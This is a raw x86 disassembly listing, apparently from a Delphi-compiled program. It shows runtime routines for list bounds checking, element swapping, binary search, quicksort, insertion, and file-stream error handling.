  408825:	3b 73 0c             	cmp    0xc(%ebx),%esi
  408828:	7d 09                	jge    0x408833
  40882a:	85 ff                	test   %edi,%edi
  40882c:	7c 05                	jl     0x408833
  40882e:	3b 7b 0c             	cmp    0xc(%ebx),%edi
  408831:	7c 05                	jl     0x408838
  408833:	e8 3c f2 ff ff       	call   0x407a74
  408838:	8b c3                	mov    %ebx,%eax
  40883a:	8b 10                	mov    (%eax),%edx
  40883c:	ff 52 6c             	call   *0x6c(%edx)
  40883f:	8b cf                	mov    %edi,%ecx
  408841:	8b d6                	mov    %esi,%edx
  408843:	8b c3                	mov    %ebx,%eax
  408845:	e8 0e 00 00 00       	call   0x408858
  40884a:	8b c3                	mov    %ebx,%eax
  40884c:	8b 10                	mov    (%eax),%edx
  40884e:	ff 52 68             	call   *0x68(%edx)
  408851:	5f                   	pop    %edi
  408852:	5e                   	pop    %esi
  408853:	5b                   	pop    %ebx
  408854:	c3                   	ret
  408855:	8d 40 00             	lea    0x0(%eax),%eax
  408858:	53                   	push   %ebx
  408859:	8b 58 08             	mov    0x8(%eax),%ebx
  40885c:	8d 14 d3             	lea    (%ebx,%edx,8),%edx
  40885f:	8b 40 08             	mov    0x8(%eax),%eax
  408862:	8d 04 c8             	lea    (%eax,%ecx,8),%eax
  408865:	8b 0a                	mov    (%edx),%ecx
  408867:	8b 18                	mov    (%eax),%ebx
  408869:	89 1a                	mov    %ebx,(%edx)
  40886b:	89 08                	mov    %ecx,(%eax)
  40886d:	8b 4a 04             	mov    0x4(%edx),%ecx
  408870:	8b 58 04             	mov    0x4(%eax),%ebx
  408873:	89 5a 04             	mov    %ebx,0x4(%edx)
  408876:	89 48 04             	mov    %ecx,0x4(%eax)
  408879:	5b                   	pop    %ebx
  40887a:	c3                   	ret
  40887b:	90                   	nop
  40887c:	53                   	push   %ebx
  40887d:	56                   	push   %esi
  40887e:	57                   	push   %edi
  40887f:	55                   	push   %ebp
  408880:	83 c4 f4             	add    $0xfffffff4,%esp
  408883:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  408887:	89 14 24             	mov    %edx,(%esp)
  40888a:	8b e8                	mov    %eax,%ebp
  40888c:	c6 44 24 08 00       	movb   $0x0,0x8(%esp)
  408891:	33 f6                	xor    %esi,%esi
  408893:	8b 7d 0c             	mov    0xc(%ebp),%edi
  408896:	4f                   	dec    %edi
  408897:	3b fe                	cmp    %esi,%edi
  408899:	7c 34                	jl     0x4088cf
  40889b:	8d 1c 37             	lea    (%edi,%esi,1),%ebx
  40889e:	d1 eb                	shr    $1,%ebx
  4088a0:	8b 45 08             	mov    0x8(%ebp),%eax
  4088a3:	8b 04 d8             	mov    (%eax,%ebx,8),%eax
  4088a6:	8b 14 24             	mov    (%esp),%edx
  4088a9:	e8 4a c4 ff ff       	call   0x404cf8
  4088ae:	85 c0                	test   %eax,%eax
  4088b0:	7d 05                	jge    0x4088b7
  4088b2:	8d 73 01             	lea    0x1(%ebx),%esi
  4088b5:	eb 14                	jmp    0x4088cb
  4088b7:	8b fb                	mov    %ebx,%edi
  4088b9:	4f                   	dec    %edi
  4088ba:	85 c0                	test   %eax,%eax
  4088bc:	75 0d                	jne    0x4088cb
  4088be:	c6 44 24 08 01       	movb   $0x1,0x8(%esp)
  4088c3:	80 7d 15 01          	cmpb   $0x1,0x15(%ebp)
  4088c7:	74 02                	je     0x4088cb
  4088c9:	8b f3                	mov    %ebx,%esi
  4088cb:	3b fe                	cmp    %esi,%edi
  4088cd:	7d cc                	jge    0x40889b
  4088cf:	8b 44 24 04          	mov    0x4(%esp),%eax
  4088d3:	89 30                	mov    %esi,(%eax)
  4088d5:	8a 44 24 08          	mov    0x8(%esp),%al
  4088d9:	83 c4 0c             	add    $0xc,%esp
  4088dc:	5d                   	pop    %ebp
  4088dd:	5f                   	pop    %edi
  4088de:	5e                   	pop    %esi
  4088df:	5b                   	pop    %ebx
  4088e0:	c3                   	ret
  4088e1:	8d 40 00             	lea    0x0(%eax),%eax
  4088e4:	53                   	push   %ebx
  4088e5:	56                   	push   %esi
  4088e6:	57                   	push   %edi
  4088e7:	8b f9                	mov    %ecx,%edi
  4088e9:	8b f2                	mov    %edx,%esi
  4088eb:	8b d8                	mov    %eax,%ebx
  4088ed:	85 f6                	test   %esi,%esi
  4088ef:	7c 05                	jl     0x4088f6
  4088f1:	3b 73 0c             	cmp    0xc(%ebx),%esi
  4088f4:	7c 05                	jl     0x4088fb
  4088f6:	e8 79 f1 ff ff       	call   0x407a74
  4088fb:	8b c7                	mov    %edi,%eax
  4088fd:	8b 53 08             	mov    0x8(%ebx),%edx
  408900:	8b 14 f2             	mov    (%edx,%esi,8),%edx
  408903:	e8 6c a8 ff ff       	call   0x403174
  408908:	5f                   	pop    %edi
  408909:	5e                   	pop    %esi
  40890a:	5b                   	pop    %ebx
  40890b:	c3                   	ret
  40890c:	8b 40 0c             	mov    0xc(%eax),%eax
  40890f:	c3                   	ret
  408910:	53                   	push   %ebx
  408911:	56                   	push   %esi
  408912:	8b f2                	mov    %edx,%esi
  408914:	8b d8                	mov    %eax,%ebx
  408916:	85 f6                	test   %esi,%esi
  408918:	7c 05                	jl     0x40891f
  40891a:	3b 73 0c             	cmp    0xc(%ebx),%esi
  40891d:	7c 05                	jl     0x408924
  40891f:	e8 50 f1 ff ff       	call   0x407a74
  408924:	8b 43 08             	mov    0x8(%ebx),%eax
  408927:	8b 44 f0 04          	mov    0x4(%eax,%esi,8),%eax
  40892b:	5e                   	pop    %esi
  40892c:	5b                   	pop    %ebx
  40892d:	c3                   	ret
  40892e:	8b c0                	mov    %eax,%eax
  408930:	8b 48 10             	mov    0x10(%eax),%ecx
  408933:	83 f9 08             	cmp    $0x8,%ecx
  408936:	7e 07                	jle    0x40893f
  408938:	ba 10 00 00 00       	mov    $0x10,%edx
  40893d:	eb 11                	jmp    0x408950
  40893f:	83 f9 04             	cmp    $0x4,%ecx
  408942:	7e 07                	jle    0x40894b
  408944:	ba 08 00 00 00       	mov    $0x8,%edx
  408949:	eb 05                	jmp    0x408950
  40894b:	ba 04 00 00 00       	mov    $0x4,%edx
  408950:	03 d1                	add    %ecx,%edx
  408952:	e8 0d 02 00 00       	call   0x408b64
  408957:	c3                   	ret
  408958:	53                   	push   %ebx
  408959:	56                   	push   %esi
  40895a:	51                   	push   %ecx
  40895b:	8b f2                	mov    %edx,%esi
  40895d:	8b d8                	mov    %eax,%ebx
  40895f:	80 7b 14 00          	cmpb   $0x0,0x14(%ebx)
  408963:	75 0e                	jne    0x408973
  408965:	8b d6                	mov    %esi,%edx
  408967:	8b c3                	mov    %ebx,%eax
  408969:	e8 1e f8 ff ff       	call   0x40818c
  40896e:	89 04 24             	mov    %eax,(%esp)
  408971:	eb 16                	jmp    0x408989
  408973:	8b cc                	mov    %esp,%ecx
  408975:	8b d6                	mov    %esi,%edx
  408977:	8b c3                	mov    %ebx,%eax
  408979:	8b 18                	mov    (%eax),%ebx
  40897b:	ff 53 70             	call   *0x70(%ebx)
  40897e:	84 c0                	test   %al,%al
  408980:	75 07                	jne    0x408989
  408982:	c7 04 24 ff ff ff ff 	movl   $0xffffffff,(%esp)
  408989:	8b 04 24             	mov    (%esp),%eax
  40898c:	5a                   	pop    %edx
  40898d:	5e                   	pop    %esi
  40898e:	5b                   	pop    %ebx
  40898f:	c3                   	ret
  408990:	53                   	push   %ebx
  408991:	56                   	push   %esi
  408992:	57                   	push   %edi
  408993:	8b f9                	mov    %ecx,%edi
  408995:	8b f2                	mov    %edx,%esi
  408997:	8b d8                	mov    %eax,%ebx
  408999:	80 7b 14 00          	cmpb   $0x0,0x14(%ebx)
  40899d:	74 0a                	je     0x4089a9
  40899f:	b8 0d f0 00 00       	mov    $0xf00d,%eax
  4089a4:	e8 b3 f0 ff ff       	call   0x407a5c
  4089a9:	85 f6                	test   %esi,%esi
  4089ab:	7c 05                	jl     0x4089b2
  4089ad:	3b 73 0c             	cmp    0xc(%ebx),%esi
  4089b0:	7e 05                	jle    0x4089b7
  4089b2:	e8 bd f0 ff ff       	call   0x407a74
  4089b7:	8b cf                	mov    %edi,%ecx
  4089b9:	8b d6                	mov    %esi,%edx
  4089bb:	8b c3                	mov    %ebx,%eax
  4089bd:	e8 06 00 00 00       	call   0x4089c8
  4089c2:	5f                   	pop    %edi
  4089c3:	5e                   	pop    %esi
  4089c4:	5b                   	pop    %ebx
  4089c5:	c3                   	ret
  4089c6:	8b c0                	mov    %eax,%eax
  4089c8:	53                   	push   %ebx
  4089c9:	56                   	push   %esi
  4089ca:	57                   	push   %edi
  4089cb:	8b f9                	mov    %ecx,%edi
  4089cd:	8b f2                	mov    %edx,%esi
  4089cf:	8b d8                	mov    %eax,%ebx
  4089d1:	8b c3                	mov    %ebx,%eax
  4089d3:	8b 10                	mov    (%eax),%edx
  4089d5:	ff 52 6c             	call   *0x6c(%edx)
  4089d8:	8b 43 0c             	mov    0xc(%ebx),%eax
  4089db:	3b 43 10             	cmp    0x10(%ebx),%eax
  4089de:	75 07                	jne    0x4089e7
  4089e0:	8b c3                	mov    %ebx,%eax
  4089e2:	e8 49 ff ff ff       	call   0x408930
  4089e7:	8b 43 0c             	mov    0xc(%ebx),%eax
  4089ea:	3b f0                	cmp    %eax,%esi
  4089ec:	7d 19                	jge    0x408a07
  4089ee:	2b c6                	sub    %esi,%eax
  4089f0:	8b c8                	mov    %eax,%ecx
  4089f2:	c1 e1 03             	shl    $0x3,%ecx
  4089f5:	8b 43 08             	mov    0x8(%ebx),%eax
  4089f8:	8d 54 f0 08          	lea    0x8(%eax,%esi,8),%edx
  4089fc:	8b 43 08             	mov    0x8(%ebx),%eax
  4089ff:	8d 04 f0             	lea    (%eax,%esi,8),%eax
  408a02:	e8 c1 9c ff ff       	call   0x4026c8
  408a07:	8b 43 08             	mov    0x8(%ebx),%eax
  408a0a:	8d 04 f0             	lea    (%eax,%esi,8),%eax
  408a0d:	8b f0                	mov    %eax,%esi
  408a0f:	33 c0                	xor    %eax,%eax
  408a11:	89 06                	mov    %eax,(%esi)
  408a13:	33 c0                	xor    %eax,%eax
  408a15:	89 46 04             	mov    %eax,0x4(%esi)
  408a18:	8b c6                	mov    %esi,%eax
  408a1a:	8b d7                	mov    %edi,%edx
  408a1c:	e8 0f a7 ff ff       	call   0x403130
  408a21:	ff 43 0c             	incl   0xc(%ebx)
  408a24:	8b c3                	mov    %ebx,%eax
  408a26:	8b 10                	mov    (%eax),%edx
  408a28:	ff 52 68             	call   *0x68(%edx)
  408a2b:	5f                   	pop    %edi
  408a2c:	5e                   	pop    %esi
  408a2d:	5b                   	pop    %ebx
  408a2e:	c3                   	ret
  408a2f:	90                   	nop
  408a30:	53                   	push   %ebx
  408a31:	56                   	push   %esi
  408a32:	57                   	push   %edi
  408a33:	8b f9                	mov    %ecx,%edi
  408a35:	8b f2                	mov    %edx,%esi
  408a37:	8b d8                	mov    %eax,%ebx
  408a39:	80 7b 14 00          	cmpb   $0x0,0x14(%ebx)
  408a3d:	74 0a                	je     0x408a49
  408a3f:	b8 0d f0 00 00       	mov    $0xf00d,%eax
  408a44:	e8 13 f0 ff ff       	call   0x407a5c
  408a49:	85 f6                	test   %esi,%esi
  408a4b:	7c 05                	jl     0x408a52
  408a4d:	3b 73 0c             	cmp    0xc(%ebx),%esi
  408a50:	7c 05                	jl     0x408a57
  408a52:	e8 1d f0 ff ff       	call   0x407a74
  408a57:	8b c3                	mov    %ebx,%eax
  408a59:	8b 10                	mov    (%eax),%edx
  408a5b:	ff 52 6c             	call   *0x6c(%edx)
  408a5e:	8b 43 08             	mov    0x8(%ebx),%eax
  408a61:	8d 04 f0             	lea    (%eax,%esi,8),%eax
  408a64:	8b d7                	mov    %edi,%edx
  408a66:	e8 c5 a6 ff ff       	call   0x403130
  408a6b:	8b c3                	mov    %ebx,%eax
  408a6d:	8b 10                	mov    (%eax),%edx
  408a6f:	ff 52 68             	call   *0x68(%edx)
  408a72:	5f                   	pop    %edi
  408a73:	5e                   	pop    %esi
  408a74:	5b                   	pop    %ebx
  408a75:	c3                   	ret
  408a76:	8b c0                	mov    %eax,%eax
  408a78:	53                   	push   %ebx
  408a79:	56                   	push   %esi
  408a7a:	57                   	push   %edi
  408a7b:	8b f9                	mov    %ecx,%edi
  408a7d:	8b f2                	mov    %edx,%esi
  408a7f:	8b d8                	mov    %eax,%ebx
  408a81:	85 f6                	test   %esi,%esi
  408a83:	7c 05                	jl     0x408a8a
  408a85:	3b 73 0c             	cmp    0xc(%ebx),%esi
  408a88:	7c 05                	jl     0x408a8f
  408a8a:	e8 e5 ef ff ff       	call   0x407a74
  408a8f:	8b c3                	mov    %ebx,%eax
  408a91:	8b 10                	mov    (%eax),%edx
  408a93:	ff 52 6c             	call   *0x6c(%edx)
  408a96:	8b 43 08             	mov    0x8(%ebx),%eax
  408a99:	89 7c f0 04          	mov    %edi,0x4(%eax,%esi,8)
  408a9d:	8b c3                	mov    %ebx,%eax
  408a9f:	8b 10                	mov    (%eax),%edx
  408aa1:	ff 52 68             	call   *0x68(%edx)
  408aa4:	5f                   	pop    %edi
  408aa5:	5e                   	pop    %esi
  408aa6:	5b                   	pop    %ebx
  408aa7:	c3                   	ret
  408aa8:	55                   	push   %ebp
  408aa9:	8b ec                	mov    %esp,%ebp
  408aab:	83 c4 f4             	add    $0xfffffff4,%esp
  408aae:	53                   	push   %ebx
  408aaf:	56                   	push   %esi
  408ab0:	57                   	push   %edi
  408ab1:	33 db                	xor    %ebx,%ebx
  408ab3:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  408ab6:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  408ab9:	89 55 fc             	mov    %edx,-0x4(%ebp)
  408abc:	8b f8                	mov    %eax,%edi
  408abe:	33 c0                	xor    %eax,%eax
  408ac0:	55                   	push   %ebp
  408ac1:	68 56 8b 40 00       	push   $0x408b56
  408ac6:	64 ff 30             	push   %fs:(%eax)
  408ac9:	64 89 20             	mov    %esp,%fs:(%eax)
  408acc:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  408acf:	8b 75 f8             	mov    -0x8(%ebp),%esi
  408ad2:	8d 45 f4             	lea    -0xc(%ebp),%eax
  408ad5:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408ad8:	03 55 f8             	add    -0x8(%ebp),%edx
  408adb:	d1 ea                	shr    $1,%edx
  408add:	8b 4f 08             	mov    0x8(%edi),%ecx
  408ae0:	8b 14 d1             	mov    (%ecx,%edx,8),%edx
  408ae3:	e8 8c a6 ff ff       	call   0x403174
  408ae8:	eb 01                	jmp    0x408aeb
  408aea:	43                   	inc    %ebx
  408aeb:	8b 47 08             	mov    0x8(%edi),%eax
  408aee:	8b 04 d8             	mov    (%eax,%ebx,8),%eax
  408af1:	8b 55 f4             	mov    -0xc(%ebp),%edx
  408af4:	e8 ff c1 ff ff       	call   0x404cf8
  408af9:	85 c0                	test   %eax,%eax
  408afb:	7c ed                	jl     0x408aea
  408afd:	eb 01                	jmp    0x408b00
  408aff:	4e                   	dec    %esi
  408b00:	8b 47 08             	mov    0x8(%edi),%eax
  408b03:	8b 04 f0             	mov    (%eax,%esi,8),%eax
  408b06:	8b 55 f4             	mov    -0xc(%ebp),%edx
  408b09:	e8 ea c1 ff ff       	call   0x404cf8
  408b0e:	85 c0                	test   %eax,%eax
  408b10:	7f ed                	jg     0x408aff
  408b12:	3b f3                	cmp    %ebx,%esi
  408b14:	7c 0d                	jl     0x408b23
  408b16:	8b ce                	mov    %esi,%ecx
  408b18:	8b d3                	mov    %ebx,%edx
  408b1a:	8b c7                	mov    %edi,%eax
  408b1c:	e8 37 fd ff ff       	call   0x408858
  408b21:	43                   	inc    %ebx
  408b22:	4e                   	dec    %esi
  408b23:	3b f3                	cmp    %ebx,%esi
  408b25:	7d c4                	jge    0x408aeb
  408b27:	3b 75 fc             	cmp    -0x4(%ebp),%esi
  408b2a:	7e 0c                	jle    0x408b38
  408b2c:	8b ce                	mov    %esi,%ecx
  408b2e:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408b31:	8b c7                	mov    %edi,%eax
  408b33:	e8 70 ff ff ff       	call   0x408aa8
  408b38:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  408b3b:	3b 5d f8             	cmp    -0x8(%ebp),%ebx
  408b3e:	7c 8c                	jl     0x408acc
  408b40:	33 c0                	xor    %eax,%eax
  408b42:	5a                   	pop    %edx
  408b43:	59                   	pop    %ecx
  408b44:	59                   	pop    %ecx
  408b45:	64 89 10             	mov    %edx,%fs:(%eax)
  408b48:	68 5d 8b 40 00       	push   $0x408b5d
  408b4d:	8d 45 f4             	lea    -0xc(%ebp),%eax
  408b50:	e8 8b a5 ff ff       	call   0x4030e0
  408b55:	c3                   	ret
  408b56:	e9 05 a2 ff ff       	jmp    0x402d60
  408b5b:	eb f0                	jmp    0x408b4d
  408b5d:	5f                   	pop    %edi
  408b5e:	5e                   	pop    %esi
  408b5f:	5b                   	pop    %ebx
  408b60:	8b e5                	mov    %ebp,%esp
  408b62:	5d                   	pop    %ebp
  408b63:	c3                   	ret
  408b64:	53                   	push   %ebx
  408b65:	56                   	push   %esi
  408b66:	8b f2                	mov    %edx,%esi
  408b68:	8b d8                	mov    %eax,%ebx
  408b6a:	8b d6                	mov    %esi,%edx
  408b6c:	c1 e2 03             	shl    $0x3,%edx
  408b6f:	8d 43 08             	lea    0x8(%ebx),%eax
  408b72:	e8 4d 9a ff ff       	call   0x4025c4
  408b77:	89 73 10             	mov    %esi,0x10(%ebx)
  408b7a:	5e                   	pop    %esi
  408b7b:	5b                   	pop    %ebx
  408b7c:	c3                   	ret
  408b7d:	8d 40 00             	lea    0x0(%eax),%eax
  408b80:	84 d2                	test   %dl,%dl
  408b82:	74 06                	je     0x408b8a
  408b84:	8b 10                	mov    (%eax),%edx
  408b86:	ff 52 6c             	call   *0x6c(%edx)
  408b89:	c3                   	ret
  408b8a:	8b 10                	mov    (%eax),%edx
  408b8c:	ff 52 68             	call   *0x68(%edx)
  408b8f:	c3                   	ret
  408b90:	53                   	push   %ebx
  408b91:	8b d8                	mov    %eax,%ebx
  408b93:	80 7b 14 00          	cmpb   $0x0,0x14(%ebx)
  408b97:	75 21                	jne    0x408bba
  408b99:	83 7b 0c 01          	cmpl   $0x1,0xc(%ebx)
  408b9d:	7e 1b                	jle    0x408bba
  408b9f:	8b c3                	mov    %ebx,%eax
  408ba1:	8b 10                	mov    (%eax),%edx
  408ba3:	ff 52 6c             	call   *0x6c(%edx)
  408ba6:	8b 4b 0c             	mov    0xc(%ebx),%ecx
  408ba9:	49                   	dec    %ecx
  408baa:	33 d2                	xor    %edx,%edx
  408bac:	8b c3                	mov    %ebx,%eax
  408bae:	e8 f5 fe ff ff       	call   0x408aa8
  408bb3:	8b c3                	mov    %ebx,%eax
  408bb5:	8b 10                	mov    (%eax),%edx
  408bb7:	ff 52 68             	call   *0x68(%edx)
  408bba:	5b                   	pop    %ebx
  408bbb:	c3                   	ret
  408bbc:	53                   	push   %ebx
  408bbd:	66 b9 01 00          	mov    $0x1,%cx
  408bc1:	33 d2                	xor    %edx,%edx
  408bc3:	8b 18                	mov    (%eax),%ebx
  408bc5:	ff 53 08             	call   *0x8(%ebx)
  408bc8:	5b                   	pop    %ebx
  408bc9:	c3                   	ret
  408bca:	8b c0                	mov    %eax,%eax
  408bcc:	53                   	push   %ebx
  408bcd:	56                   	push   %esi
  408bce:	57                   	push   %edi
  408bcf:	8b d8                	mov    %eax,%ebx
  408bd1:	66 b9 01 00          	mov    $0x1,%cx
  408bd5:	33 d2                	xor    %edx,%edx
  408bd7:	8b c3                	mov    %ebx,%eax
  408bd9:	8b 30                	mov    (%eax),%esi
  408bdb:	ff 56 08             	call   *0x8(%esi)
  408bde:	8b f0                	mov    %eax,%esi
  408be0:	66 b9 02 00          	mov    $0x2,%cx
  408be4:	33 d2                	xor    %edx,%edx
  408be6:	8b c3                	mov    %ebx,%eax
  408be8:	8b 38                	mov    (%eax),%edi
  408bea:	ff 57 08             	call   *0x8(%edi)
  408bed:	8b f8                	mov    %eax,%edi
  408bef:	33 c9                	xor    %ecx,%ecx
  408bf1:	8b d6                	mov    %esi,%edx
  408bf3:	8b c3                	mov    %ebx,%eax
  408bf5:	8b 18                	mov    (%eax),%ebx
  408bf7:	ff 53 08             	call   *0x8(%ebx)
  408bfa:	8b c7                	mov    %edi,%eax
  408bfc:	5f                   	pop    %edi
  408bfd:	5e                   	pop    %esi
  408bfe:	5b                   	pop    %ebx
  408bff:	c3                   	ret
  408c00:	53                   	push   %ebx
  408c01:	56                   	push   %esi
  408c02:	57                   	push   %edi
  408c03:	8b d9                	mov    %ecx,%ebx
  408c05:	8b fa                	mov    %edx,%edi
  408c07:	8b f0                	mov    %eax,%esi
  408c09:	85 db                	test   %ebx,%ebx
  408c0b:	74 25                	je     0x408c32
  408c0d:	8b d7                	mov    %edi,%edx
  408c0f:	8b cb                	mov    %ebx,%ecx
  408c11:	8b c6                	mov    %esi,%eax
  408c13:	8b 30                	mov    (%eax),%esi
  408c15:	ff 56 04             	call   *0x4(%esi)
  408c18:	3b d8                	cmp    %eax,%ebx
  408c1a:	74 16                	je     0x408c32
  408c1c:	b9 04 f0 00 00       	mov    $0xf004,%ecx
  408c21:	b2 01                	mov    $0x1,%dl
  408c23:	b8 74 76 40 00       	mov    $0x407674,%eax
  408c28:	e8 ff db ff ff       	call   0x40682c
  408c2d:	e8 e6 a1 ff ff       	call   0x402e18
  408c32:	5f                   	pop    %edi
  408c33:	5e                   	pop    %esi
  408c34:	5b                   	pop    %ebx
  408c35:	c3                   	ret
  408c36:	8b c0                	mov    %eax,%eax
  408c38:	8b 40 04             	mov    0x4(%eax),%eax
  408c3b:	e8 a4 c1 ff ff       	call   0x404de4
  408c40:	83 f8 ff             	cmp    $0xffffffff,%eax
  408c43:	75 02                	jne    0x408c47
  408c45:	33 c0                	xor    %eax,%eax
  408c47:	c3                   	ret
  408c48:	8b 40 04             	mov    0x4(%eax),%eax
  408c4b:	e8 c0 c1 ff ff       	call   0x404e10
  408c50:	83 f8 ff             	cmp    $0xffffffff,%eax
  408c53:	75 02                	jne    0x408c57
  408c55:	33 c0                	xor    %eax,%eax
  408c57:	c3                   	ret
  408c58:	0f b7 c9             	movzwl %cx,%ecx
  408c5b:	8b 40 04             	mov    0x4(%eax),%eax
  408c5e:	e8 d9 c1 ff ff       	call   0x404e3c
  408c63:	c3                   	ret
  408c64:	55                   	push   %ebp
  408c65:	8b ec                	mov    %esp,%ebp
  408c67:	83 c4 f4             	add    $0xfffffff4,%esp
  408c6a:	53                   	push   %ebx
  408c6b:	56                   	push   %esi
  408c6c:	57                   	push   %edi
  408c6d:	84 d2                	test   %dl,%dl
  408c6f:	74 08                	je     0x408c79
  408c71:	83 c4 f0             	add    $0xfffffff0,%esp
  408c74:	e8 f7 9e ff ff       	call   0x402b70
  408c79:	8b f1                	mov    %ecx,%esi
  408c7b:	88 55 ff             	mov    %dl,-0x1(%ebp)
  408c7e:	8b d8                	mov    %eax,%ebx
  408c80:	8b 7d 08             	mov    0x8(%ebp),%edi
  408c83:	0f b7 c7             	movzwl %di,%eax
  408c86:	3d ff ff 00 00       	cmp    $0xffff,%eax
  408c8b:	75 35                	jne    0x408cc2
  408c8d:	8b c6                	mov    %esi,%eax
  408c8f:	e8 2c c1 ff ff       	call   0x404dc0
  408c94:	8b f8                	mov    %eax,%edi
  408c96:	89 7b 04             	mov    %edi,0x4(%ebx)
  408c99:	85 ff                	test   %edi,%edi
  408c9b:	7d 5b                	jge    0x408cf8
  408c9d:	89 75 f4             	mov    %esi,-0xc(%ebp)
  408ca0:	c6 45 f8 0b          	movb   $0xb,-0x8(%ebp)
  408ca4:	8d 45 f4             	lea    -0xc(%ebp),%eax
  408ca7:	50                   	push   %eax
  408ca8:	6a 00                	push   $0x0
  408caa:	b9 01 f0 00 00       	mov    $0xf001,%ecx
  408caf:	b2 01                	mov    $0x1,%dl
  408cb1:	b8 70 75 40 00       	mov    $0x407570,%eax
  408cb6:	e8 e1 db ff ff       	call   0x40689c
  408cbb:	e8 58 a1 ff ff       	call   0x402e18
  408cc0:	eb 36                	jmp    0x408cf8
  408cc2:	0f b7 d7             	movzwl %di,%edx
  408cc5:	8b c6                	mov    %esi,%eax
  408cc7:	e8 b4 c0 ff ff       	call   0x404d80
  408ccc:	89 43 04             	mov    %eax,0x4(%ebx)
  408ccf:	83 7b 04 00          	cmpl   $0x0,0x4(%ebx)
  408cd3:	7d 23                	jge    0x408cf8
  408cd5:	89 75 f4             	mov    %esi,-0xc(%ebp)
  408cd8:	c6 45 f8 0b          	movb   $0xb,-0x8(%ebp)
  408cdc:	8d 45 f4             	lea    -0xc(%ebp),%eax
  408cdf:	50                   	push   %eax
  408ce0:	6a 00                	push   $0x0
  408ce2:	b9 02 f0 00 00       	mov    $0xf002,%ecx
  408ce7:	b2 01                	mov    $0x1,%dl
  408ce9:	b8 b4 75 40 00       	mov    $0x4075b4,%eax
  408cee:	e8 a9 db ff ff       	call   0x40689c
  408cf3:	e8 20 a1 ff ff       	call   0x402e18
  408cf8:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
  408cfc:	74 0a                	je     0x408d08
  408cfe:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  408d05:	83 c4 0c             	add    $0xc,%esp
  408d08:	8b c3                	mov    %ebx,%eax
  408d0a:	5f                   	pop    %edi
  408d0b:	5e                   	pop    %esi
  408d0c:	5b                   	pop    %ebx
  408d0d:	8b e5                	mov    %ebp,%esp
  408d0f:	5d                   	pop    %ebp
  408d10:	c2 04 00             	ret    $0x4
  408d13:	90                   	nop
  408d14:	53                   	push   %ebx
  408d15:	56                   	push   %esi
  408d16:	8b da                	mov    %edx,%ebx
  408d18:	8b f0                	mov    %eax,%esi
  408d1a:	8b 46 04             	mov    0x4(%esi),%eax
  408d1d:	85 c0                	test   %eax,%eax
  408d1f:	7c 05                	jl     0x408d26
  408d21:	e8 22 c1 ff ff       	call   0x404e48
  408d26:	84 db                	test   %bl,%bl
  408d28:	74 07                	je     0x408d31
  408d2a:	8b c6                	mov    %esi,%eax
  408d2c:	e8 7b 9e ff ff       	call   0x402bac
  408d31:	8b c6                	mov    %esi,%eax
  408d33:	5e                   	pop    %esi
  408d34:	5b                   	pop    %ebx
  408d35:	c3                   	ret
  408d36:	8b c0                	mov    %eax,%eax
  408d38:	53                   	push   %ebx
  408d39:	56                   	push   %esi
  408d3a:	57                   	push   %edi
  408d3b:	55                   	push   %ebp
  408d3c:	8b ea                	mov    %edx,%ebp
  408d3e:	8b f8                	mov    %eax,%edi
  408d40:	a1 5c c5 40 00       	mov    0x40c55c,%eax
  408d45:	8b 58 08             	mov    0x8(%eax),%ebx
  408d48:	4b                   	dec    %ebx
  408d49:	83 fb 00             	cmp    $0x0,%ebx
  408d4c:	7c 42                	jl     0x408d90
  408d4e:	8b d3                	mov    %ebx,%edx
  408d50:	a1 5c c5 40 00       	mov    0x40c55c,%eax
  408d55:	e8 a2 ed ff ff       	call   0x407afc
  408d5a:	8b f0                	mov    %eax,%esi
  408d5c:	85 ff                	test   %edi,%edi
  408d5e:	74 05                	je     0x408d65
  408d60:	3b 7e 08             	cmp    0x8(%esi),%edi
  408d63:	75 25                	jne    0x408d8a
  408d65:	85 ed                	test   %ebp,%ebp
  408d67:	74 0e                	je     0x408d77
  408d69:	8b 56 10             	mov    0x10(%esi),%edx
  408d6c:	8b c5                	mov    %ebp,%eax
  408d6e:	e8 31 bf ff ff       	call   0x404ca4
  408d73:	85 c0                	test   %eax,%eax
  408d75:	75 13                	jne    0x408d8a
  408d77:	8b d3                	mov    %ebx,%edx
  408d79:	a1 5c c5 40 00       	mov    0x40c55c,%eax
  408d7e:	e8 35 ed ff ff       	call   0x407ab8
  408d83:	8b c6                	mov    %esi,%eax
  408d85:	e8 42 9c ff ff       	call   0x4029cc
  408d8a:	4b                   	dec    %ebx
  408d8b:	83 fb ff             	cmp    $0xffffffff,%ebx
  408d8e:	75 be                	jne    0x408d4e
  408d90:	5d                   	pop    %ebp
  408d91:	5f                   	pop    %edi
  408d92:	5e                   	pop    %esi
  408d93:	5b                   	pop    %ebx
  408d94:	c3                   	ret
  408d95:	8d 40 00             	lea    0x0(%eax),%eax
  408d98:	53                   	push   %ebx
  408d99:	8b d8                	mov    %eax,%ebx
  408d9b:	8b cb                	mov    %ebx,%ecx
  408d9d:	b2 01                	mov    $0x1,%dl
  408d9f:	b8 34 76 40 00       	mov    $0x407634,%eax
  408da4:	e8 83 da ff ff       	call   0x40682c
  408da9:	e8 6a a0 ff ff       	call   0x402e18
  408dae:	5b                   	pop    %ebx
  408daf:	c3                   	ret
  408db0:	b8 15 f0 00 00       	mov    $0xf015,%eax
  408db5:	e8 de ff ff ff       	call   0x408d98
  408dba:	c3                   	ret
  408dbb:	90                   	nop
  408dbc:	53                   	push   %ebx
  408dbd:	56                   	push   %esi
  408dbe:	8b da                	mov    %edx,%ebx
  408dc0:	8b f0                	mov    %eax,%esi
  408dc2:	8b c6                	mov    %esi,%eax
  408dc4:	e8 5b 01 00 00       	call   0x408f24
  408dc9:	3a d8                	cmp    %al,%bl
  408dcb:	74 0f                	je     0x408ddc
  408dcd:	ff 4e 10             	decl   0x10(%esi)
  408dd0:	8b c6                	mov    %esi,%eax
  408dd2:	e8 51 02 00 00       	call   0x409028
  408dd7:	e8 d4 ff ff ff       	call   0x408db0
  408ddc:	5e                   	pop    %esi
  408ddd:	5b                   	pop    %ebx
  408dde:	c3                   	ret
  408ddf:	90                   	nop
  408de0:	53                   	push   %ebx
  408de1:	8b d8                	mov    %eax,%ebx
  408de3:	8b c3                	mov    %ebx,%eax
